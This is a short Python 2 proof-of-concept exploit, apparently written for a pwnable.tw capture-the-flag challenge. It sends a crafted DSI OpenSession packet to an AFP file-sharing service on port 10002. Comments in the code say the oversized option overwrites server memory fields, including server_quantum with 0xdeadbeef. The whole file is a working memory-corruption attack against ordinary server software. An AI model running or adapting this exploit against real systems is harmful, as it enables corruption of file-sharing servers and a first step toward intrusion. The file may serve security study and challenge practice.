import socket
import struct
import sys

ip = "192.168.1.178"
#ip = "chall.pwnable.tw"
port = 10002

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[+] Attempting connection to " + ip + ":" + str(port)
sock.connect((ip, port))

dsi_opensession = "\x01" # attention quantum option
dsi_opensession += "\x0c" # length
dsi_opensession += "\x00\x00\x40\x00" # client quantum
dsi_opensession += "\x00\x00\x00\x00" # overwrite datasize
dsi_opensession += struct.pack("I", 0xdeadbeef) # overwrite server_quantum

dsi_header = "\x00" # "request" flag
dsi_header += "\x04" # open session command
dsi_header += "\x00\x01" # request id
dsi_header += "\x00\x00\x00\x00" # data offset
dsi_header += struct.pack(">I", len(dsi_opensession))
dsi_header += "\x00\x00\x00\x00" # reserved
dsi_header += dsi_opensession # payload

sock.sendall(dsi_header)

try:
    resp = sock.recv(1024)
    print "[+] Fin."
except:
    print "[-] No response!"
